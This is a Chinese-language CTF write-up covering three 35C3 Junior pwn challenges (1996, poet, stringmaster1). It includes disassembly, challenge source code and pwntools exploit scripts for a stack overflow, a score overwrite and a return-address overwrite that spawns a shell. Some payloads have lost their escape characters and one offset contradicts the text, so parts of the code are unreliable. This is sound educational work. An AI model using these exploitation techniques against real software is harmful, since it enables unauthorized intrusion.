# 35C3 Junior pwn笔记（上）

阅读量 **312063**

|评论 **2**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-01-19 10:30:43

 **x**

##### 译文声明

本文是翻译文章

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p5.ssl.qhimg.com/t01afe24aa73e7dfe92.png)

## 前言

在被期末预习虐得半死的时候看到35c3的消息就去稍微看看题，结果又被非libc虐哭，在被虐哭后看到还有Junior赛就过去把Junior的pwn题悄咪咪的写了几题,但在做这些题到后面时还是会卡住，所以在这紧张刺激的期末考结束后写一点笔记来记录和复习下，这里先记录下libc非2.27的题目

## 1996

惯例先checksec文件

    
    
    ➜  1996 checksec 1996
    [*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/1996/1996'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    

因为最近在练看汇编题目稍微看了下程序逻辑也不难所以就直接就看汇编分析了

    
    
    Dump of assembler code for function main:
       0x00000000004008cd <+0>:    push   rbp
       0x00000000004008ce <+1>:    mov    rbp,rsp
       0x00000000004008d1 <+4>:    push   rbx
       0x00000000004008d2 <+5>:    sub    rsp,0x408
       0x00000000004008d9 <+12>:    lea    rsi,[rip+0x188]        # 0x400a68
       0x00000000004008e0 <+19>:    lea    rdi,[rip+0x200779]        # 0x601060 <std::cout@@GLIBCXX_3.4>
       0x00000000004008e7 <+26>:    call   0x400760 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
       0x00000000004008ec <+31>:    lea    rax,[rbp-0x410]
       0x00000000004008f3 <+38>:    mov    rsi,rax
       0x00000000004008f6 <+41>:    lea    rdi,[rip+0x200883]        # 0x601180 <std::cin@@GLIBCXX_3.4>
       0x00000000004008fd <+48>:    call   0x400740 <std::basic_istream<char, std::char_traits<char> >& std::operator>><char, std::char_traits<char> >(std::basic_istream<char, std::char_traits<char> >&, char*)@plt>
       0x0000000000400902 <+53>:    lea    rax,[rbp-0x410]
       0x0000000000400909 <+60>:    mov    rsi,rax
       0x000000000040090c <+63>:    lea    rdi,[rip+0x20074d]        # 0x601060 <std::cout@@GLIBCXX_3.4>
       0x0000000000400913 <+70>:    call   0x400760 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
       0x0000000000400918 <+75>:    lea    rsi,[rip+0x17a]        # 0x400a99
       0x000000000040091f <+82>:    mov    rdi,rax
       0x0000000000400922 <+85>:    call   0x400760 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
       0x0000000000400927 <+90>:    mov    rbx,rax
       0x000000000040092a <+93>:    lea    rax,[rbp-0x410]
       0x0000000000400931 <+100>:    mov    rdi,rax
       0x0000000000400934 <+103>:    call   0x400780 <getenv@plt>
       0x0000000000400939 <+108>:    mov    rsi,rax
       0x000000000040093c <+111>:    mov    rdi,rbx
       0x000000000040093f <+114>:    call   0x400760 <std::basic_ostream<char, std::char_traits<char> >& std::operator<< <std::char_traits<char> >(std::basic_ostream<char, std::char_traits<char> >&, char const*)@plt>
       0x0000000000400944 <+119>:    mov    rdx,rax
       0x0000000000400947 <+122>:    mov    rax,QWORD PTR [rip+0x200692]        # 0x600fe0
       0x000000000040094e <+129>:    mov    rsi,rax
       0x0000000000400951 <+132>:    mov    rdi,rdx
       0x0000000000400954 <+135>:    call   0x400770 <std::ostream::operator<<(std::ostream& (*)(std::ostream&))@plt>
       0x0000000000400959 <+140>:    mov    eax,0x0
       0x000000000040095e <+145>:    add    rsp,0x408
       0x0000000000400965 <+152>:    pop    rbx
       0x0000000000400966 <+153>:    pop    rbp
       0x0000000000400967 <+154>:    ret
    End of assembler dump.
    

看一下程序的main我们可以知道这里用cin来读取，如果用c来说就相当与gets也就是一个很明显的栈溢出，接着我们看到lea
rax,[rbp-0x410],我们就知道了bufsize=0x410  
到了这里我们基本就随便玩了，因为给了执行/bin/sh的函数所以我们直接溢出劫持执行流到spawn_shell函数

    
    
    Dump of assembler code for function _Z11spawn_shellv:
       0x0000000000400897 <+0>:    push   rbp
       0x0000000000400898 <+1>:    mov    rbp,rsp
       0x000000000040089b <+4>:    sub    rsp,0x10
       0x000000000040089f <+8>:    lea    rax,[rip+0x1b3]        # 0x400a59
       0x00000000004008a6 <+15>:    mov    QWORD PTR [rbp-0x10],rax
       0x00000000004008aa <+19>:    mov    QWORD PTR [rbp-0x8],0x0
       0x00000000004008b2 <+27>:    lea    rax,[rbp-0x10]
       0x00000000004008b6 <+31>:    mov    edx,0x0
       0x00000000004008bb <+36>:    mov    rsi,rax
       0x00000000004008be <+39>:    lea    rdi,[rip+0x194]        # 0x400a59
       0x00000000004008c5 <+46>:    call   0x4007a0 <execve@plt>
       0x00000000004008ca <+51>:    nop
       0x00000000004008cb <+52>:    leave
       0x00000000004008cc <+53>:    ret
    End of assembler dump.
    

或者用其他的栈溢出方法，因为是简单题就不多赘述了，直接放EXP

    
    
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import*
    context(os='linux',arch='amd64',log_level='debug')
    #n = process('./1996')
    n = remote('35.207.132.47',22227)
    elf = ELF('./1996')
    
    sh_addr = 0x0400897
    
    n.recvuntil('?')
    n.sendline('a'*(0x410+8)+p64(sh_addr))
    
    n.interactive()
    

## poet

    
    
    ➜  poet checksec poet
    [*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/poet/poet'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    

简单的运行下程序看看程序的大致逻辑

    
    
    ➜  poet ./poet
    
    **********************************************************
    * We are searching for the poet of the year 2018.        *
    * Submit your one line poem now to win an amazing prize! *
    **********************************************************
    
    Enter the poem here:
    > aaaaaaa
    Who is the author of this poem?
    > nepire
    
    +---------------------------------------------------------------------------+
    THE POEM
    aaaaaaa
    SCORED 0 POINTS.
    
    SORRY, THIS POEM IS JUST NOT GOOD ENOUGH.
    YOU MUST SCORE EXACTLY 1000000 POINTS.
    TRY AGAIN!
    +---------------------------------------------------------------------------+
    

大致的就是让你写首诗(gou……)然后程序会给你评个分，最终目标是得到1000000分，接着看下大概的汇编

    
    
    Dump of assembler code for function main:
       0x000000000040098b <+0>:    push   rbx
       0x000000000040098c <+1>:    mov    ecx,0x0
       0x0000000000400991 <+6>:    mov    edx,0x2
       0x0000000000400996 <+11>:    mov    esi,0x0
       0x000000000040099b <+16>:    mov    rdi,QWORD PTR [rip+0x2016de]        # 0x602080 <stdout@@GLIBC_2.2.5>
       0x00000000004009a2 <+23>:    call   0x400640 <setvbuf@plt>
       0x00000000004009a7 <+28>:    lea    rdi,[rip+0x292]        # 0x400c40
       0x00000000004009ae <+35>:    call   0x400600 <puts@plt>
       0x00000000004009b3 <+40>:    lea    rbx,[rip+0x2016e6]        # 0x6020a0 <poem>
       0x00000000004009ba <+47>:    mov    eax,0x0
       0x00000000004009bf <+52>:    call   0x400935 <get_poem>
       0x00000000004009c4 <+57>:    mov    eax,0x0
       0x00000000004009c9 <+62>:    call   0x400965 <get_author>
       0x00000000004009ce <+67>:    mov    eax,0x0
       0x00000000004009d3 <+72>:    call   0x4007b7 <rate_poem>
       0x00000000004009d8 <+77>:    cmp    DWORD PTR [rbx+0x440],0xf4240
       0x00000000004009e2 <+87>:    je     0x4009f2 <main+103>
       0x00000000004009e4 <+89>:    lea    rdi,[rip+0x345]        # 0x400d30
       0x00000000004009eb <+96>:    call   0x400600 <puts@plt>
       0x00000000004009f0 <+101>:    jmp    0x4009ba <main+47>
       0x00000000004009f2 <+103>:    mov    eax,0x0
       0x00000000004009f7 <+108>:    call   0x400767 <reward>
    End of assembler dump.
    

main就三个关键逻辑函数(get_poem/get_author/rate_poem)，reward函数就是一个getflag的函数就不细分析了  
先看下get_poem和get_author的代码

    
    
    Dump of assembler code for function get_poem:
       0x0000000000400935 <+0>:        sub    rsp,0x8
       0x0000000000400939 <+4>:        lea    rdi,[rip+0x17b]        # 0x400abb
       0x0000000000400940 <+11>:    mov    eax,0x0
       0x0000000000400945 <+16>:    call   0x400610 <printf@plt>
       0x000000000040094a <+21>:    lea    rdi,[rip+0x20174f]     # 0x6020a0 <poem>
       0x0000000000400951 <+28>:    call   0x400630 <gets@plt>
       0x0000000000400956 <+33>:    mov    DWORD PTR [rip+0x201b80],0x0        # 0x6024e0 <poem+1088>
       0x0000000000400960 <+43>:    add    rsp,0x8
       0x0000000000400964 <+47>:    ret
    End of assembler dump.
    
    
    
    Dump of assembler code for function get_author:
       0x0000000000400965 <+0>:        sub    rsp,0x8
       0x0000000000400969 <+4>:        lea    rdi,[rip+0x2a8]     # 0x400c18
       0x0000000000400970 <+11>:    mov    eax,0x0
       0x0000000000400975 <+16>:    call   0x400610 <printf@plt>
       0x000000000040097a <+21>:    lea    rdi,[rip+0x201b1f]  # 0x6024a0 <poem+1024>
       0x0000000000400981 <+28>:    call   0x400630 <gets@plt>
       0x0000000000400986 <+33>:    add    rsp,0x8
       0x000000000040098a <+37>:    ret
    End of assembler dump.
    

没什么大问题，不过用了gets可能会存在越界写什么的先保留可能  
接着看下关键的评分函数

    
    
    Dump of assembler code for function rate_poem:
       0x00000000004007b7 <+0>:        push   r13
       0x00000000004007b9 <+2>:        push   r12
       0x00000000004007bb <+4>:        push   rbp
       0x00000000004007bc <+5>:        push   rbx
       0x00000000004007bd <+6>:        sub    rsp,0x408
       0x00000000004007c4 <+13>:    mov    rbx,rsp
       0x00000000004007c7 <+16>:    lea    rsi,[rip+0x2018d2]        # 0x6020a0 <poem>
       0x00000000004007ce <+23>:    mov    rdi,rbx
       0x00000000004007d1 <+26>:    call   0x4005f0 <strcpy@plt>
       0x00000000004007d6 <+31>:    lea    rsi,[rip+0x2b4]        # 0x400a91
       0x00000000004007dd <+38>:    mov    rdi,rbx
       0x00000000004007e0 <+41>:    call   0x400660 <strtok@plt>
       0x00000000004007e5 <+46>:    test   rax,rax
       0x00000000004007e8 <+49>:    je     0x400909 <rate_poem+338>
       0x00000000004007ee <+55>:    lea    rbx,[rip+0x29f]        # 0x400a94 "ESPR"
       0x00000000004007f5 <+62>:    lea    rbp,[rip+0x2aa]        # 0x400aa6 "eat"
       0x00000000004007fc <+69>:    lea    r12,[rip+0x296]        # 0x400a99 "sleep"
       0x0000000000400803 <+76>:    lea    r13,[rip+0x295]        # 0x400a9f "pwn"
       0x000000000040080a <+83>:    jmp    0x40082d <rate_poem+118>
       0x000000000040080c <+85>:    add    DWORD PTR [rip+0x201ccd],0x64        # 0x6024e0 <poem+1088>
       0x0000000000400813 <+92>:    lea    rsi,[rip+0x277]        # 0x400a91 "n"
       0x000000000040081a <+99>:    mov    edi,0x0
       0x000000000040081f <+104>:    call   0x400660 <strtok@plt>
       0x0000000000400824 <+109>:    test   rax,rax
       0x0000000000400827 <+112>:    je     0x400909 <rate_poem+338>
       0x000000000040082d <+118>:    mov    ecx,0x5
       0x0000000000400832 <+123>:    mov    rsi,rax
       0x0000000000400835 <+126>:    mov    rdi,rbx
       0x0000000000400838 <+129>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x000000000040083a <+131>:    seta   dl
       0x000000000040083d <+134>:    sbb    dl,0x0
       0x0000000000400840 <+137>:    test   dl,dl
       0x0000000000400842 <+139>:    je     0x40080c <rate_poem+85>
       0x0000000000400844 <+141>:    mov    ecx,0x4
       0x0000000000400849 <+146>:    mov    rsi,rax
       0x000000000040084c <+149>:    mov    rdi,rbp
       0x000000000040084f <+152>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x0000000000400851 <+154>:    seta   dl
       0x0000000000400854 <+157>:    sbb    dl,0x0
       0x0000000000400857 <+160>:    test   dl,dl
       0x0000000000400859 <+162>:    je     0x40080c <rate_poem+85>
       0x000000000040085b <+164>:    mov    ecx,0x6
       0x0000000000400860 <+169>:    mov    rsi,rax
       0x0000000000400863 <+172>:    mov    rdi,r12
       0x0000000000400866 <+175>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x0000000000400868 <+177>:    seta   dl
       0x000000000040086b <+180>:    sbb    dl,0x0
       0x000000000040086e <+183>:    test   dl,dl
       0x0000000000400870 <+185>:    je     0x40080c <rate_poem+85>
       0x0000000000400872 <+187>:    mov    ecx,0x4
       0x0000000000400877 <+192>:    mov    rsi,rax
       0x000000000040087a <+195>:    mov    rdi,r13
       0x000000000040087d <+198>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x000000000040087f <+200>:    seta   dl
       0x0000000000400882 <+203>:    sbb    dl,0x0
       0x0000000000400885 <+206>:    test   dl,dl
       0x0000000000400887 <+208>:    je     0x40080c <rate_poem+85>
       0x0000000000400889 <+210>:    mov    ecx,0x7
       0x000000000040088e <+215>:    lea    rdi,[rip+0x20e]        # 0x400aa3 "repeat"
       0x0000000000400895 <+222>:    mov    rsi,rax
       0x0000000000400898 <+225>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x000000000040089a <+227>:    seta   dl
       0x000000000040089d <+230>:    sbb    dl,0x0
       0x00000000004008a0 <+233>:    test   dl,dl
       0x00000000004008a2 <+235>:    je     0x40080c <rate_poem+85>
       0x00000000004008a8 <+241>:    mov    ecx,0x4
       0x00000000004008ad <+246>:    lea    rdi,[rip+0x1f6]        # 0x400aaa "CTF"
       0x00000000004008b4 <+253>:    mov    rsi,rax
       0x00000000004008b7 <+256>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x00000000004008b9 <+258>:    seta   dl
       0x00000000004008bc <+261>:    sbb    dl,0x0
       0x00000000004008bf <+264>:    test   dl,dl
       0x00000000004008c1 <+266>:    je     0x40080c <rate_poem+85>
       0x00000000004008c7 <+272>:    mov    ecx,0x8
       0x00000000004008cc <+277>:    lea    rdi,[rip+0x1db]        # 0x400aae "capture"
       0x00000000004008d3 <+284>:    mov    rsi,rax
       0x00000000004008d6 <+287>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x00000000004008d8 <+289>:    seta   dl
       0x00000000004008db <+292>:    sbb    dl,0x0
       0x00000000004008de <+295>:    test   dl,dl
       0x00000000004008e0 <+297>:    je     0x40080c <rate_poem+85>
       0x00000000004008e6 <+303>:    mov    ecx,0x5
       0x00000000004008eb <+308>:    lea    rdi,[rip+0x1c4]        # 0x400ab6 "flag"
       0x00000000004008f2 <+315>:    mov    rsi,rax
       0x00000000004008f5 <+318>:    repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi]
       0x00000000004008f7 <+320>:    seta   al
       0x00000000004008fa <+323>:    sbb    al,0x0
       0x00000000004008fc <+325>:    test   al,al
       0x00000000004008fe <+327>:    jne    0x400813 <rate_poem+92>
       0x0000000000400904 <+333>:    jmp    0x40080c <rate_poem+85>
       0x0000000000400909 <+338>:    mov    edx,DWORD PTR [rip+0x201bd1]  # 0x6024e0 <poem+1088>
       0x000000000040090f <+344>:    lea    rsi,[rip+0x20178a]            # 0x6020a0 <poem>
       0x0000000000400916 <+351>:    lea    rdi,[rip+0x283]        # 0x400ba0
       0x000000000040091d <+358>:    mov    eax,0x0
       0x0000000000400922 <+363>:    call   0x400610 <printf@plt>
       0x0000000000400927 <+368>:    add    rsp,0x408
       0x000000000040092e <+375>:    pop    rbx
       0x000000000040092f <+376>:    pop    rbp
       0x0000000000400930 <+377>:    pop    r12
       0x0000000000400932 <+379>:    pop    r13
       0x0000000000400934 <+381>:    ret
    End of assembler dump.
    

这一大段看了半天还是很混乱就去用ida反编译了一下发现还是很乱就换动态调试去理解下这里是做了什么  
输了一堆脏数据后发现诗中有’flag’,’CTF’,’capture’，’repeat’的每有其中一个就加100point,但不能直接输入10000个’CTF’，程序会崩,这里稍稍卡了一会，不过在尝试输入了`'a'*
0x100` 和’`b'*
0x100`后，返回得到的分数是1650614882，突然出现一个大数让我看到溢出的可能性，调试…………发现这个分数转十六进制是0x62626262,立马意识到这里的author可以直接溢出覆盖poem
point的结果！经过简单定位得到偏移量为0x3c,我们把1000000转成十六进制就是0x0f4240，然后直接`'a'*0x3c+'x0fx42x40'`得到的poem
point是0x40420f(4211215)并不是想要的point,稍微改一下payload改成小端序的  
`payload = 'a' * 0x3c + 'x40x42x0f'`，success！

EXP

    
    
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import*
    context(os='linux',arch='amd64',log_level='debug')
    n = process('./poet')
    elf = ELF('./poet')
    
    n.recvuntil('> ')
    n.sendline('nepire')
    n.recvuntil('> ')
    
    n.sendline('a'*64+'x0fx42x40')
    
    n.interactive()
    

###  stringmaster1

    
    
    ➜  stringmaster1 checksec stringmaster1
    [*] '/home/Ep3ius/CTF/pwn/process/35c3CTF2018/Junior/stringmaster1/stringmaster1'
        Arch:     amd64-64-little
        RELRO:    Partial RELRO
        Stack:    No canary found
        NX:       NX enabled
        PIE:      No PIE (0x400000)
    

在粗略过一遍接近4k行还看得难受得半死的c++汇编后,立即推放弃看汇编，给了源码就直接怼源码

    
    
    #include <iostream>
    #include <cstdlib>
    #include <ctime>
    #include <vector>
    #include <unistd.h>
    #include <limits>
    
    using namespace std;
    
    const string chars = "abcdefghijklmnopqrstuvwxy";
    void spawn_shell()
    {
        char* args[] = {(char*)"/bin/bash", NULL};
        execve("/bin/bash", args, NULL);
    }
    void print_menu()
    {
        cout << endl;
        cout << "Enter the command you want to execute:" << endl;
        cout << "[1] swap <index1> <index2>                   (Cost: 1)" << endl;
        cout << "[2] replace <char1> <char2>                  (Cost: 1)" << endl;
        cout << "[3] print                                    (Cost: 1)" << endl;
        cout << "[4] quit                                              " << endl;
        cout << "> ";
    }
    
    void play()
    {
        string from(10, '0');
        string to(10, '0');
        for (int i = 0; i < 10; ++i)
        {
            from[i] = chars[rand() % (chars.length() - 1)];
            to[i] = chars[rand() % (chars.length() - 1)];
        }
    
    
        cout << "Perform the following operations on String1 to generate String2 with minimum costs." << endl << endl;
        cout << "[1] swap <index1> <index2>                   (Cost: 1)" << endl;
        cout << "    Swaps the char at index1 with the char at index2  " << endl;
        cout << "[2] replace <char1> <char2>                  (Cost: 1)" << endl;
        cout << "    Replaces the first occurence of char1 with char2  " << endl;
        cout << "[3] print                                    (Cost: 1)" << endl;
        cout << "    Prints the current version of the string          " << endl;
        cout << "[4] quit                                              " << endl;
        cout << "    Give up and leave the game                        " << endl;
        cout << endl;
        cout << "String1: " << from << endl;
        cout << "String2: " << to << endl;
        cout << endl;
    
        unsigned int costs = 0;
        string s(from);
    
        while (true)
        {
            print_menu();
    
            string command;
            cin >> command;
    
            if (command == "swap")
            {
                unsigned int i1, i2;
                cin >> i1 >> i2;
                if (cin.good() && i1 < s.length() && i2 < s.length())
                {
                    swap(s[i1], s[i2]);
                }
                costs += 1;
            }
            else if (command == "replace")
            {
                char c1, c2;
                cin >> c1 >> c2;
                auto index = s.find(c1);
                cout << c1 << c2 << index << endl;
                if (index >= 0)
                {
                    s[index] = c2;
                }
                costs += 1;
            }
            else if (command == "print")
            {
                cout << s << endl;
                costs += 1;
            }
            else if (command == "quit")
            {
                cout << "You lost." << endl;
                break;
            }
            else
            {
                cout << "Invalid command" << endl;
            }
    
            if (!cin)
            {
                cin.clear();
                cin.ignore(numeric_limits<streamsize>::max(), 'n');
            }
            if (!cout)
            {
                cout.clear();
            }
    
            if (s == to)
            {
                cout << s.length() << endl;
                cout << endl;
                cout << "****************************************" << endl;
                cout << "* Congratulations                       " << endl;
                cout << "* You solved the problem with cost: " << costs << endl;
                cout << "****************************************" << endl;
                cout << endl;
                break;
            }
        }
    }
    
    int main()
    {
        srand(time(nullptr));
        play();
    }
    

程序的大致流程：  
1.先初始化一个以时间为种子的随机数  
2.随机生成两个string类型的key  
3.进入有三个功能的标准菜单循环  
4.最终需要把函数劫持到spawn_shell函数(0x4011A7)中getshell

我们可以看到程序中用了一个看上去不那么舒服的find函数

    
    
    auto index = s.find(c1);
    

然后我们再看下cplusplus给出的find函数模板和样例

    
    
    template <class InputIterator, class T>
    InputIterator
    find (
      InputIterator first,
      InputIterator last,
      const T& val
    );
    
    
    
    // find example
    #include <iostream>     // std::cout
    #include <algorithm>    // std::find
    #include <vector>       // std::vector
    
    int main () {
      // using std::find with array and pointer:
      int myints[] = { 10, 20, 30, 40 };
      int * p;
      p = std::find (myints, myints+4, 30);
      if (p != myints+4)
        std::cout << "Element found in myints: " << *p << 'n';
      else
        std::cout << "Element not found in myintsn";
      // using std::find with vector and iterator:
      std::vector<int> myvector (myints,myints+4);
      std::vector<int>::iterator it;
      it = find (myvector.begin(), myvector.end(), 30);
      if (it != myvector.end())
        std::cout << "Element found in myvector: " << *it << 'n';
      else
        std::cout << "Element not found in myvectorn";
      return 0;
    }
    

程序并没有给出find的first和last,那么我们稍微调试一下replace部分就能得到这个可以基本达成栈上的任意写，也就是说只要改play函数的retrun指针指向spwan_shell就可以成功getshell了，由于开始的位置和return指针之间不能保证要改的那个值只有在return指针有，所以我们多修改几次就能成功的修改指针来getshell了  
EXP

    
    
    #! /usr/bin/env python
    # -*- coding: utf-8 -*-    from pwn import*
    context(os='linux',arch='amd64',log_level='debug')
    n = process('./stringmaster1')
    elf = ELF('./stringmaster1')
    libc = elf.libc
    
    #n.recvuntil('String1: ')
    #str1 = n.recvline().strip()
    #n.recvuntil('String2: ')
    #str2 = n.recvline().strip()
    
    for i in range(4):
        n.recvuntil('')
        n.sendline('replace x24 x11')
    
    for i in range(4):
        n.recvuntil('')
        n.sendline('replace x6d xa7')
    
    n.sendline('quit')
    n.interactive()
    

####  参考链接

[cplusplus_find](http://www.cplusplus.com/reference/algorithm/find/)

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **悲离赋** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/169775](/post/id/169775)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [Pwn](/tag/Pwn)
  * [CTF](/tag/CTF)

 **+1** __0赞

 __收藏

![](https://p4.ssl.qhimg.com/t01b82eb3eba810438e.png) 悲离赋

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

